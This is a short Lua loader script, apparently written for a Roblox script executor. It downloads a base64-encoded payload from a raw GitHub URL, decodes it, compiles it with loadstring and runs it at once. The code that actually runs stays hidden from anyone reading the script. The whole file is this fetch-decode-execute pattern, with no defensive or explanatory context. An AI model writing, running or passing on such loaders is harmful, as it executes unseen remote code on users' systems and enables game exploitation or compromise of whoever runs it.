local url = "https://raw.githubusercontent.com/brianemaddielindas/supremasdocoven/main/tvl2maddiexbrianend"

local encoded = game:HttpGet(url .. "?t=" .. tick())

local decoded = base64decode(encoded)

local func, err = loadstring(decoded)

if not func then
	warn("Loadstring erro:", err)
	return
end

func()
